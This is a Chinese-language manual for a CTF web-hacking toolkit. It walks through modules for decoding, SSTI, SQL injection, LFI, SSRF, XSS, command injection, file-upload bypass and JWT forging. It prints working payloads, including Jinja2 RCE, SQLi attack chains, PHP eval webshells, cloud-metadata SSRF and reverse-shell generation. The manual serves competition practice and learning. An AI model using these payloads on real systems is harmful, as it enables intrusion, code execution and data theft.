# Yang-Web 操作手册 📖

> 每个功能的详细操作方法、使用场景、示例和技巧

---

## 启动方式

### GUI 图形界面（推荐）
双击桌面 **Yang-web** 图标，暗色窗口启动后顶部有 Tab 标签页切换功能模块。

### CLI 命令行
```bash
cd C:\Users\阳\.qclaw\workspace\Yang-web
python -m yang_web sqli --db MySQL
```

---

## 1. 🔓 解码器

**场景**：拿到一段乱码 / 编码字符串，不知道是什么格式，要还原成明文。

### CLI 操作
```bash
# 自动检测 + 链式解码（推荐）
python -m yang_web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="

# 暴力尝试所有编码器，筛选可读结果
python -m yang_web decode --brute "dGVzdA=="

# 管道输入
echo "ZmxhZ3t0ZXN0fQ==" | python -m yang_web decode
```

### GUI 操作
1. 点击 **🔓 解码** 标签
2. 在输入框粘贴密文
3. 点 **🔍 自动解码** → 查看链式解码过程
4. 如果自动检测不准，点 **💣 暴力尝试** → 列出所有可能的结果

### 支持编码
base64 / base32 / base16 / base58 / base85 / URL编码 / HTML实体 / ROT13 / 二进制 / 八进制 / 十进制ASCII / Unicode转义 / 摩斯电码

---

## 2. 🔢 编码

**场景**：构造 Payload 时需要把特殊字符编码。

```bash
python -m yang_web encode base64 "admin' OR 1=1 -- "
python -m yang_web encode url "id"
python -m yang_web encode rot13 "flag"
```

---

## 3. 🎨 SSTI 模板注入

**场景**：网页输入 `{{7*7}}` 返回 `49`，确认 SSTI 漏洞后利用。

### GUI 操作
1. 点击 **🎨 SSTI** 标签
2. 从下拉框选择引擎（默认全部）
3. 查看检测 Payload 和利用 Payload
4. 搜索框搜 `RCE` 找远程执行相关 Payload

### CLI 操作
```bash
# 列出支持的引擎
python -m yang_web ssti --list

# 获取指定引擎的检测 Payload
python -m yang_web ssti --detect --engine "Jinja2"

# 获取利用 Payload（RCE / 文件读取）
python -m yang_web ssti --exploit --engine "Jinja2"

# 搜索特定 Payload
python -m yang_web ssti --search RCE
```

### 支持引擎
Jinja2 (Flask) · Twig (Symfony) · Smarty (PHP) · Mako (Python) · ERB (Ruby) · FreeMarker (Java) · Velocity (Java) · Django

### 典型 Payload
```
Jinja2 RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /flag', shell=True) }}

Twig RCE:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

---

## 4. 🗄️ SQL 注入

**场景**：发现注入点后，从探测到脱库一步到位。

### GUI 操作
1. 点击 **🗄️ SQLi** 标签
2. 下拉框选数据库类型（MySQL / PG / MSSQL / Oracle / SQLite）
3. 左侧显示该数据库的所有 Payload
4. 搜索框搜 `报错` / `时间` / `堆叠` 等关键词
5. 点击顶部其他 Tab 查看 **WAF 绕过技巧**

### CLI 操作
```bash
# 列出支持的数据库
python -m yang_web sqli --list

# 显示探测 Payload（闭合/列数/回显位/指纹）
python -m yang_web sqli --detect

# 获取 MySQL 全量 Payload
python -m yang_web sqli --db MySQL

# 获取盲注模板
python -m yang_web sqli --blind

# 搜索 Payload
python -m yang_web sqli --search 报错

# 🆕 WAF 绕过
python -m yang_web sqli --waf              # 全部
python -m yang_web sqli --waf 空白符绕过    # 按分类
python -m yang_web sqli --waf 关键字变形
```

### 典型攻击链
```
1. 闭合探测: '  → 报错 → 确认注入
2. 列数探测: ORDER BY 3 → 正常 / ORDER BY 4 → 报错 → 3列
3. 回显位: UNION SELECT 1,2,3 → 页面显示 2 → 第2位可回显
4. 数据库名: UNION SELECT 1,database(),3
5. 表名: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
6. 列名: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'
7. 脱数据: UNION SELECT 1,flag_column,3 FROM flag_table
```

### WAF 绕过速查
| 场景 | 方法 | 示例 |
|------|------|------|
| 空格被过滤 | 注释/括号/空白符 | `'/**/UNION/**/SELECT/**/1` |
| 关键字被过滤 | 双写/大小写 | `seselectlect` |
| select 被过滤 | 编码 | `char(115,101,108,101,99,116)` |
| 等号被过滤 | like/rlike | `' AND 1 LIKE 1` |
| 逗号被过滤 | JOIN | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` |
| 引号被过滤 | 宽字节 | `%df' OR 1=1#` |

---

## 5. 📂 LFI 文件包含

**场景**：URL 中有 `?page=xxx` → 读源码 / 日志污染 → RCE。

### GUI 操作
1. 点击 **📂 LFI** 标签
2. 下拉框选类别（路径遍历 / PHP伪协议 / 敏感文件）

### CLI 操作
```bash
# 路径遍历 Payload
python -m yang_web lfi --traversal

# Linux 敏感文件列表
python -m yang_web lfi --linux

# Windows 敏感文件列表
python -m yang_web lfi --windows

# PHP 伪协议
python -m yang_web lfi --php

# PHP filter chain 生成器
python -m yang_web lfi --filter-chain
```

### 典型攻击链
```
1. 读 /etc/passwd: ../../../etc/passwd
2. 读源码: php://filter/convert.base64-encode/resource=index.php
3. 日志污染: 在 User-Agent 写 <?php eval($_POST[1]);?> → 包含 access.log
4. data:// RCE: data://text/plain,<?php system('id');?>
5. expect:// RCE: expect://id
```

---

## 6. 🌐 SSRF

**场景**：URL 参数接受任意地址 → 读云元数据 / 打内网。

### CLI 操作
```bash
# 云平台元数据地址
python -m yang_web ssrf --cloud aws      # AWS
python -m yang_web ssrf --cloud aliyun    # 阿里云
python -m yang_web ssrf --cloud tencent   # 腾讯云

# 内网地址段
python -m yang_web ssrf --internal

# 协议利用（gopher 打 Redis / dict 扫端口）
python -m yang_web ssrf --protocol

# 绕过技巧
python -m yang_web ssrf --bypass
```

### 典型 Payload
```
AWS 元数据: http://169.254.169.254/latest/meta-data/
阿里云:     http://100.100.100.200/latest/meta-data/
Gopher 打 Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
```

---

## 7. 💉 XSS

**场景**：输入框没有过滤 → XSS → 窃取 Cookie / 钓鱼。

### CLI 操作
```bash
# 检测 Payload
python -m yang_web xss --detect

# 窃取 Payload
python -m yang_web xss --steal cookie     # Cookie 窃取
python -m yang_web xss --steal storage    # LocalStorage 窃取

# 绕过技巧
python -m yang_web xss --bypass

# Vue / Angular 模板注入
python -m yang_web xss --template
```

---

## 8. 💻 RCE 命令注入

**场景**：`?cmd=ping 127.0.0.1` 能执行命令 → 反弹 Shell。

### CLI 操作
```bash
# 命令注入 Payload
python -m yang_web rce --inject

# 生成反弹 Shell
python -m yang_web rce --shell bash --ip 10.0.0.1 --port 4444
python -m yang_web rce --shell python --ip 10.0.0.1 --port 4444
python -m yang_web rce --shell powershell --ip 10.0.0.1 --port 4444

# 自定义反弹 Shell
python -m yang_web rce --custom
```

### 链接符速查
```
;  |  ||  &&  &  %0a  \n  `  $()
```

### 空格绕过
```
${IFS}  $IFS$9  <>  {cmd,arg}  %09  %0a
```

---

## 9. 🐘 PHP 技巧

**场景**：PHP 代码审计 / 弱类型逻辑绕过 / WAF 拦截。

### GUI 操作
1. 点击 **🐘 PHP** 标签
2. 查看 Magic Hash / 弱类型比较 / RCE Bypass / WAF 绕过

### CLI 操作
```bash
# Magic Hash
python -m yang_web php --magic

# 弱类型比较
python -m yang_web php --type-juggle

# 反序列化
python -m yang_web php --deserialize

# RCE Bypass
python -m yang_web php --rce

# 🆕 WAF 绕过
python -m yang_web php --waf-php
```

### Magic Hash 怎么用
```
if ($_GET['password'] == '0e46209743...') → 弱比较绕过密码
```
输入 `240610708` 即可（它的 MD5 以 `0e` 开头 → PHP 将其解释为科学计数法 0）

### WAF 绕过怎么选
```
eval 被过滤 → evaleval (双写) 或 'ev'.'al' (拼接) 或 assert (替换)
system 被过滤 → `id` (反引号) 或 call_user_func('system','id')
关键字被过滤 → base64_decode('...') 或 str_rot13('...')
```

---

## 10. 📤 文件上传

**场景**：上传头像处 → "只能上传图片" → 绕过限制上传 Shell。

### GUI 操作
1. 点击 **📤 Upload** 标签
2. 依次查看：后缀绕过 → MIME 伪造 → 内容绕过 → 解析漏洞 → 高级技巧

### CLI 操作
```bash
# 后缀名绕过
python -m yang_web upload --ext

# Content-Type 伪造
python -m yang_web upload --mime

# 图片马内容
python -m yang_web upload --content

# 解析漏洞
python -m yang_web upload --parse nginx
python -m yang_web upload --parse apache
python -m yang_web upload --parse iis

# .htaccess / .user.ini
python -m yang_web upload --htaccess
python -m yang_web upload --userini

# 高级技巧
python -m yang_web upload --advanced
```

### 典型攻击链
```
1. 后缀绕过: shell.php → 被拦截
2. 换后缀: shell.php3 / shell.phtml / shell.php. . (Win)
3. 改 MIME: Content-Type: image/jpeg + 文件头 GIF89a
4. 内容绕过: GIF89a<?=eval($_POST[1]);?>
5. 上传成功 → 访问
6. 如果还不行 → .htaccess / .user.ini / 条件竞争
```

### 一句话速查
```
图片马: GIF89a<?=eval($_POST[1]);?>
.htaccess: AddType application/x-httpd-php .jpg
.user.ini: auto_prepend_file=shell.jpg
Nginx解析: 上传 1.jpg → 访问 /uploads/1.jpg/1.php
```

---

## 11. 🔍 Hash 识别

**场景**：拿到一段 Hash，不知道是什么算法。

### GUI 操作
1. 点击 **🔍 Hash** 标签
2. 粘贴 Hash → 点 **识别**

### CLI 操作
```bash
python -m yang_web hashid "e10adc3949ba59abbe56e057f20f883e"
python -m yang_web hashid "$2y$10$..."
```

### 输出示例
```
📋 输入: e10adc3949ba59abbe56e057f20f883e
📏 长度: 32 字符
📊 可能的算法:
  • MD5
  • NTLM
  • MD4
  • Domain Cached Credentials
```

---

## 12. 🔑 JWT 攻击

**场景**：登录后 Cookie 里有 `eyJ...` → JWT Token → 尝试攻击。

### GUI 操作
1. 点击 **🔑 JWT** 标签
2. 粘贴 Token
3. 依次点：**📋 解析** → **🔍 分析** → **⚡ None攻击** → **💣 弱密钥爆破**

### CLI 操作
```bash
# 解析（查看 header + payload）
python -m yang_web jwt "eyJhbGciOiJSUzI1NiIs..."

# 安全分析
python -m yang_web jwt "eyJ..." --analyze

# None 算法攻击（alg 改为 none）
python -m yang_web jwt "eyJ..." --none

# 弱密钥爆破
python -m yang_web jwt "eyJ..." --brute

# 已知密钥伪造 Token
python -m yang_web jwt "eyJ..." --forge --secret "mysecret" --payload '{"admin":true}'
```

### 典型攻击链
```
1. 解析 JWT → 查看 alg (RS256/HS256)
2. 如果有 jku/jwk → SSRF / 密钥注入
3. 尝试 None 攻击 → alg: none → 签名置空
4. 弱密钥爆破 → 内置 100+ 常见密钥
5. 拿到密钥 → 伪造 admin Token
```

---

## 13. 📡 目录扫描

**场景**：拿到了目标网站，想知道有哪些隐藏目录/文件。

### CLI 操作
```bash
# 目录扫描
python -m yang_web scan dir --search flag
python -m yang_web scan dir --search config
python -m yang_web scan dir --search admin

# 文件扫描
python -m yang_web scan file --search backup
python -m yang_web scan file --search sql

# 列出所有词库
python -m yang_web scan --list
```

### 内置词库
- 目录：300+ 条（admin/backup/config/flag/log/upload...）
- 文件：100+ 条（index.php.bak/www.zip/.git/config...）

---

## 📊 功能速查表

| 遇到什么 | 用什么命令 | 一键命令 |
|----------|-----------|---------|
| 一段乱码 | decode | `python -m yang_web decode "xxx"` |
| 模板注入 | ssti | `python -m yang_web ssti --exploit --engine Jinja2` |
| SQL 注入 | sqli | `python -m yang_web sqli --db MySQL` |
| 文件包含 | lfi | `python -m yang_web lfi --traversal` |
| SSRF | ssrf | `python -m yang_web ssrf --cloud aws` |
| XSS | xss | `python -m yang_web xss --detect` |
| 命令注入 | rce | `python -m yang_web rce --shell bash --ip IP --port PORT` |
| PHP 绕过 | php | `python -m yang_web php --waf-php` |
| 文件上传 | upload | `python -m yang_web upload --ext` |
| 未知 Hash | hashid | `python -m yang_web hashid "xxx"` |
| JWT Token | jwt | `python -m yang_web jwt "eyJ..."` |
| 目录扫描 | scan | `python -m yang_web scan dir --search flag` |

---

## 💡 GUI vs CLI 选择

| | GUI | CLI |
|------|:---:|:---:|
| 浏览 Payload | ✅ 直观 | ⚠ 需记参数 |
| 快速复制 | ✅ Ctrl+C | ✅ pipe |
| 搜索筛选 | ✅ 框输入 | ✅ --search |
| 批量/脚本 | ❌ | ✅ |
| 比赛环境 | ⚠ 需显示器 | ✅ 纯终端 |

建议：平时用 GUI 浏览和学习，打比赛时用 CLI 快速调用。
